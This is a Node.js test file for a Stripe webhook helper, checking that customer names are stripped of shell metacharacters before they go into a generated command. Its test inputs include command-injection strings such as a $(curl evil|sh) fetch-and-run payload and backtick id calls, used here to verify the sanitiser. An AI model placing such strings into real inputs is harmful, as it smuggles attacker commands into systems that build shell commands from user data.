import { test } from 'node:test';
import assert from 'node:assert';
import { safeName, mintCommand } from './stripe-webhook.mjs';
test('safeName strips shell metacharacters', () => {
  assert.equal(safeName('Rob $(curl evil|sh)'), 'Rob curl evilsh');
  assert.equal(safeName('a`id`b'), 'aidb');
  assert.equal(safeName("O'Neil-Smith j.o@x.y"), "O'Neil-Smith j.o@x.y");
  assert.equal(safeName(''), 'New customer');
});
test('mintCommand contains no $ or backtick even for hostile names', () => {
  const cmd = mintCommand({ name: '$(touch /tmp/pwn)`id`"', email: 'a@b.c' });
  assert.ok(!/[$`]/.test(cmd), cmd);
});
